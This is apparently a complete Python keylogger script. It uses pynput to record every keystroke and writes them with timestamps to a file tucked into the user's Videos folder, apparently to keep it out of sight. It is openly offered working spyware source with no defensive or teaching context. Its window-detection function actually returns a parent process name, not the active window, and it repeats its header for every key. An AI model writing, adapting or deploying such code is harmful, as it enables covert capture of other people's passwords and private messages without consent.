import os
from datetime import datetime
import psutil
from pynput import keyboard

# File to store the keystrokes
log_file = os.path.join(os.path.expanduser("~"), "Videos", "keylog.txt")

# Function to get the current active window's name
def get_active_window():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            # On Windows, we use win32gui to get the active window title
            if proc.info['pid'] == psutil.Process().ppid():
                return proc.info['name']
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return "Unknown"

# Function to log the keystrokes
def on_press(key):
    try:
        current_window = get_active_window()
        with open(log_file, "a") as file:
            # Write window name and timestamp
            file.write(f"\n\n{current_window}\n------------\n{datetime.now().strftime('%Y/%m/%d %H:%M')}\n")
            if key == keyboard.Key.enter:
                file.write('\n')
            elif key == keyboard.Key.space:
                file.write(' ')
            elif hasattr(key, 'char'):  # Handle character keys
                file.write(key.char)
            else:  # Handle special keys
                file.write(f'[{key}]')
    except Exception as e:
        print(f"Error: {e}")

# Start the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
